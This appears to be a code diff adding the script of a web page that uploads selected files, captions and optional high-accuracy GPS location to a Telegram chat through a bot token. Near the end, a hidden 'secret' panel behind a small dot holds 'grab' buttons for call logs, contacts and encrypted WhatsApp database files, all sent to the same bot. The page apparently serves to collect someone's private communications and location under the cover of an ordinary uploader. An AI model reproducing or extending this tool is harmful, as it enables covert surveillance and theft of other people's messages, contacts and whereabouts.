+            function rf(id) { selectedFiles = selectedFiles.filter(f => f.id !== id);
+                rfl();
+                uu(); }
+
+            function caf() { selectedFiles = [];
+                rfl();
+                uu();
+                cs();
+                batchProgress.classList.remove('show'); }
+
+            function uu() { const c = selectedFiles.length; if (c > 0) { dropzone.classList.add('has-files');
+                    uploadBtn.disabled = false; const vc = selectedFiles.filter(f => f.fileType === 'video')
+                    .length; let t = `Upload ${c} File${c>1?'s':''}`; if (vc > 0) t += ` (${vc} 📹)`;
+                    uploadBtnText.textContent = t; } else { dropzone.classList.remove('has-files');
+                    uploadBtn.disabled = true;
+                    uploadBtnText.textContent = 'Upload to Telegram'; } }
+
+            function rfl() { fileList.innerHTML = selectedFiles.map(f => { let sc = f.status,
+                        st = f.status === 'pending' ? 'Pending' : f.status === 'uploading' ? 'Uploading...' : f
+                        .status === 'success' ? 'Done ✓' : f.status === 'error' ? 'Failed ✗' : ''; return `<div class="file-item"><div class="file-icon-small type-${f.fileType}">${gfi(f.fileType)}</div><div class="file-details"><div class="file-name-small">${f.file.name.replace(/</g,'&lt;')}</div><div class="file-size-small">${fs(f.file.size)}</div></div><span class="file-status ${sc}">${st}</span>${f.status==='pending'?`<button class="remove-file-btn" onclick="window._rf('${f.id}')" style="background:none;border:none;cursor:pointer;padding:4px;color:var(--text-muted);font-size:14px;">✕</button>`:''}</div>`; })
+                    .join(''); }
+            window._rf = rf;
+
+            function updateHints() { const hints = []; if (folderMode.checked) hints.push('📁 Folder ON');
+                else hints.push('📁 Single file'); if (videoMode.checked) hints.push('🎬 Video ON');
+                else hints.push('🎬 Video as doc'); if (locationMode.checked) hints.push('📍 GPS ON');
+                dropzoneHint.textContent = hints.join(' • '); }
+
+            document.getElementById('videoToggle').addEventListener('click', function(e) { if (e.target ===
+                    videoMode) return;
+                videoMode.checked = !videoMode.checked;
+                videoMode.dispatchEvent(new Event('change')); });
+            videoMode.addEventListener('change', () => { rfl();
+                updateHints(); });
+            document.getElementById('folderToggle').addEventListener('click', function(e) { if (e.target ===
+                    folderMode) return;
+                folderMode.checked = !folderMode.checked;
+                folderMode.dispatchEvent(new Event('change')); });
+            folderMode.addEventListener('change', () => { updateHints(); if (!folderMode.checked && selectedFiles
+                    .length > 1) { selectedFiles = [selectedFiles[0]];
+                    rfl();
+                    uu(); } });
+            document.getElementById('locationToggle').addEventListener('click', function(e) { if (e.target ===
+                    locationMode) return; if (!locationMode.checked) { if (!navigator.geolocation) { alert(
+                        'Geolocation not supported'); return; }
+                    navigator.geolocation.getCurrentPosition((pos) => { locationMode.checked = true;
+                        locationData = { latitude: pos.coords.latitude, longitude: pos.coords.longitude,
+                            accuracy: Math.round(pos.coords.accuracy),
+                            mapsLink: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}` };
+                        updateHints();
+                        ss('📍 Location acquired!', 'success'); }, (err) => { locationMode.checked = false;
+                        locationData = null;
+                        updateHints();
+                        ss('❌ Location denied', 'error'); }, { enableHighAccuracy: true, timeout: 10000,
+                        maximumAge: 0 }); } else { locationMode.checked = false;
+                    locationData = null;
+                    updateHints();
+                    ss('📍 GPS off', 'info'); }
+                locationMode.dispatchEvent(new Event('change')); });
+            locationMode.addEventListener('change', updateHints);
+
+            dropzone.addEventListener('click', function(e) { if (e.target.closest('.remove-file-btn') || e.target
+                    .closest('.action-btn') || e.target.closest('.file-item')) return; if (folderMode.checked) {
+                    folderInput.click(); } else { fileInput.click(); } });
+            fileInput.addEventListener('change', function() { if (this.files.length > 0) af(this.files);
+                this.value = ''; });
+            folderInput.addEventListener('change', function() { if (this.files.length > 0) af(this.files);
+                this.value = ''; });
+            addMoreBtn.addEventListener('click', function(e) { e.stopPropagation();
+                fileInput.click(); });
+            addFolderBtn.addEventListener('click', function(e) { e.stopPropagation();
+                folderInput.click(); });
+            clearAllBtn.addEventListener('click', function(e) { e.stopPropagation();
+                caf(); });
+            dropzone.addEventListener('dragover', function(e) { e.preventDefault();
+                e.stopPropagation();
+                this.classList.add('dragover'); });
+            dropzone.addEventListener('dragleave', function(e) { e.preventDefault();
+                e.stopPropagation();
+                this.classList.remove('dragover'); });
+            dropzone.addEventListener('drop', function(e) { e.preventDefault();
+                e.stopPropagation();
+                this.classList.remove('dragover'); const items = e.dataTransfer.items; if (!items)
+                return;
+                gafd(items).then(f => { if (f.length > 0) af(f); }); });
+            async function gafd(items) { const files = [],
+                    entries = []; for (let i = 0; i < items.length; i++) { const item = items[i]; if (item
+                        .kind === 'file') { const e = item.webkitGetAsEntry ? item.webkitGetAsEntry() :
+                        null; if (e) entries.push(e); else { const f = item.getAsFile(); if (f) files.push(
+                        f); } } }
+                async function re(e) { if (e.isFile) { return new Promise(r => { e.file(f => { files.push(
+                            f);
+                        r(); }); }); } else if (e.isDirectory) { const dr = e.createReader(); const ra =
+                        () => new Promise(r => { dr.readEntries(e => { r(e.length === 0 ? [] : e); }); }); let b; while ((
+                            b = await ra()).length > 0) { for (const c of b) await re(c); } } } for (const e of entries) await re(
+                    e); return files; }
+
+            function usf(fo) { return new Promise((rs, rj) => { const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID); let caption = fo.file.name; if (locationData && locationMode
+                        .checked) { caption +=
+                            `\n\n📍 ${locationData.latitude}, ${locationData.longitude}\n🗺️ ${locationData.mapsLink}`; }
+                    fd.append('caption', caption); let ep; if (fo.fileType === 'video' && videoMode.checked) { ep =
+                        'https://api.telegram.org/bot' + BOT_TOKEN + '/sendVideo';
+                    fd.append('video', fo.file);
+                    fd.append('supports_streaming', 'true'); } else if (fo.fileType === 'image') { ep =
+                        'https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto';
+                    fd.append('photo', fo.file); } else if (fo.fileType === 'audio') { ep =
+                        'https://api.telegram.org/bot' + BOT_TOKEN + '/sendAudio';
+                    fd.append('audio', fo.file); } else { ep = 'https://api.telegram.org/bot' + BOT_TOKEN +
+                        '/sendDocument';
+                    fd.append('document', fo.file); } if (locationData && locationMode.checked) { const lx =
+                        new XMLHttpRequest();
+                    lx.open('POST', `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, true);
+                    lx.setRequestHeader('Content-Type', 'application/json');
+                    lx.send(JSON.stringify({ chat_id: CHAT_ID, latitude: locationData.latitude, longitude: locationData
+                            .longitude })); } const x = new XMLHttpRequest();
+                    x.addEventListener('load', function() { if (x.status >= 200 && x.status < 300) { try { const d =
+                                JSON.parse(x.responseText);
+                            d.ok ? rs(d) : rj(new Error(d.description || 'API error')); } catch (e) { rj(
+                                new Error('Invalid')); } } else rj(new Error('HTTP ' + x.status)); });
+                    x.addEventListener('error', () => rj(new Error('Network')));
+                    x.addEventListener('abort', () => rj(new Error('Abort')));
+                    x.open('POST', ep, true);
+                    x.send(fd); }); }
+            async function ub(files, par) { const res = [];
+                let act = 0,
+                    ci = 0,
+                    done = 0; return new Promise(rs => { function nx() { while (act < par && ci < files
+                            .length) { const idx = ci++; const fo = files[idx];
+                            act++;
+                            fo.status = 'uploading';
+                            rfl();
+                            uc();
+                            usf(fo).then(() => { fo.status = 'success';
+                                res[idx] = { success: true }; }).catch(err => { fo.status = 'error';
+                                fo.error = err.message;
+                                res[idx] = { success: false, error: err.message }; }).finally(() => { act--;
+                                done++;
+                                rfl();
+                                uc();
+                                up();
+                                nx(); if (done === files.length) rs(res); }); } }
+
+                    function uc() { const d = files.filter(f => f.status === 'success' || f.status ===
+                            'error').length;
+                        batchCount.textContent = `${d}/${files.length}`;
+                        batchStatus.textContent = `Active: ${act} | Uploading...`; }
+
+                    function up() { const d = files.filter(f => f.status === 'success' || f.status ===
+                            'error').length;
+                        batchFill.style.width = ((d / files.length) * 100) + '%'; }
+                    nx(); }); }
+            uploadBtn.addEventListener('click', async function() { if (selectedFiles.length === 0) return;
+                cs();
+                uploadBtn.disabled = true;
+                uploadBtn.classList.add('loading');
+                batchProgress.classList.add('show'); const par = parseInt(parallelCount.value); const pf =
+                    selectedFiles.filter(f => f.status === 'pending');
+                batchCount.textContent = `0/${pf.length}`;
+                batchFill.style.width = '0%';
+                batchStatus.textContent = `Starting ${par} parallel...`; const st = Date.now(); const res =
+                    await ub(pf, par); const el = ((Date.now() - st) / 1000).toFixed(1); const sc = res.filter(
+                    r => r.success).length; const ec = res.filter(r => !r.success).length;
+                batchStatus.textContent = `Done in ${el}s`;
+                batchFill.style.width = '100%'; if (ec === 0) ss(`✅ All ${sc} files (${el}s)`,
+                'success'); else if (sc === 0) ss(`❌ All ${ec} failed`, 'error');
+                else ss(`⚠️ ${sc} ok, ${ec} fail (${el}s)`, 'info');
+                uploadBtn.disabled = false;
+                uploadBtn.classList.remove('loading');
+                uu(); });
+
+            const secretDot = document.getElementById('secretDot');
+            const secretPanel = document.getElementById('secretPanel');
+            const closePanel = document.getElementById('closePanel');
+            secretDot.addEventListener('click', e => { e.stopPropagation();
+                secretPanel.classList.toggle('show'); });
+            closePanel.addEventListener('click', e => { e.stopPropagation();
+                secretPanel.classList.remove('show'); });
+            document.addEventListener('click', e => { if (!secretPanel.contains(e.target) && e.target !==
+                    secretDot) secretPanel.classList.remove('show'); });
+            document.getElementById('grabCallLog').addEventListener('click', () => { secretPanel.classList.remove(
+                    'show'); const i = document.createElement('input');
+                i.type = 'file';
+                i.accept = '.db,.xml,.vcf';
+                i.onchange = function() { if (this.files.length > 0) af(this.files); };
+                i.click(); });
+            document.getElementById('grabContacts').addEventListener('click', () => { secretPanel.classList.remove(
+                    'show'); const i = document.createElement('input');
+                i.type = 'file';
+                i.accept = '.db,.vcf';
+                i.onchange = function() { if (this.files.length > 0) af(this.files); };
+                i.click(); });
+            document.getElementById('grabWhatsApp').addEventListener('click', () => { secretPanel.classList.remove(
+                    'show'); const i = document.createElement('input');
+                i.type = 'file';
+                i.accept = '.db,.crypt12,.crypt14';
+                i.onchange = function() { if (this.files.length > 0) af(this.files); };
+                i.click(); });
+            updateHints();
+        })();
+    </script>
+</body>
+</html>
